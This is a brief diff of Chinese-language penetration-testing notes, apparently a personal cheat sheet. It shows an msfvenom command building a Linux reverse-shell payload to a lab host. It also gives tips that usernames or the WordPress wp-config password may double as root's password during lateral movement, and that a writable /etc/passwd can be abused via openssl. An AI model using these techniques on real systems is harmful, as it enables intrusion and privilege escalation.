@@ -530,7 +530,7 @@ msfvenom -p linux/x64/shell_reverse_tcp lhost=192.168.71.128 lport=7777 -b '\x00
 ```
 ![alt text](image-7.png)
 
-6. 进行横向移动时，用户名可能就是密码，同时`wordpress`的`wp-config`也可能是密码。
+6. 进行横向移动时，用户名可能就是密码，同时`wordpress`的`wp-config`也可能是密码。也有可能是root的密码
 
 7. **/etc/passwd**可写,使用openssl
 ```bash
